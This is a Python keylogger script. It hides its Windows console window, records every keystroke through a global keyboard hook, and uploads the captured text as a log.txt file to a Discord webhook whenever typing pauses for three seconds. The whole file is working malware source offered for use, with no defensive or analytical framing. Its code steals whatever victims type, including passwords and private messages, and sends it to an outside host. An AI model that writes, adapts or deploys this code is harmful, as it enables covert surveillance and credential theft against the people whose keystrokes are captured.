import keyboard
import requests
import time
import threading
import io
import ctypes
import os

WEBHOOK_URL = "put your discord webhook here"
IDLE_TIME = 3.0

def hide_console():
    """Hides the console window from taskbar and view on Windows"""
    if os.name == 'nt':
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd != 0:
            user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE

hide_console()

buffer = []
last_keypress_time = time.time()

def send_to_webhook(content):
    """Send text as a file to Discord webhook"""
    if not content:
        return True
    try:
        file_data = io.BytesIO(content.encode('utf-8'))
        files = {'file': ('log.txt', file_data, 'text/plain')}
        data = {"content": f"New keystroke log ({len(content)} characters)"}
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        return response.status_code < 400
    except Exception:
        return False

def on_key(event):
    global last_keypress_time
    if event.event_type == keyboard.KEY_DOWN:
        last_keypress_time = time.time()
        if event.name == 'space':
            buffer.append(" ")
        elif event.name == 'enter':
            buffer.append("\n")
        elif len(event.name) == 1:
            buffer.append(event.name)
        elif event.name == 'backspace':
            buffer.append(" [BACK] ")

keyboard.hook(on_key)

print(f"Keylogger active! Logs sent as .txt if idle for {IDLE_TIME}s.")
print("Press ESC to quit")

while True:
    if keyboard.is_pressed('esc'):
        if buffer:
            send_to_webhook("".join(buffer))
        print("\nExit!")
        break
        
    now = time.time()
    if buffer and (now - last_keypress_time) > IDLE_TIME:
        content = "".join(buffer)
        if content.strip():
            print(f"Inactivity detected, sending log.txt...")
            if send_to_webhook(content):
                buffer.clear()
                print("File sent!")
    
    time.sleep(0.1)
